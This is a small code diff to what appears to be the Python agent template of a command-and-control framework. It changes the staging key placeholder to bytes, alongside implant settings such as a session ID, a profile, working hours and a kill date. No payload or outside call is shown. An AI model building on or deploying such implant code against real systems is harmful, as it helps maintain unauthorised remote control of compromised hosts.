@@ -28,7 +28,7 @@ def post_message(uri, data):
 sessionID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
 
 # server configuration information
-stagingKey = '{{ staging_key }}'
+stagingKey = b'{{ staging_key }}'
 profile = '{{ profile }}'
 WorkingHours = '{{ working_hours }}'
 KillDate = '{{ kill_date }}'
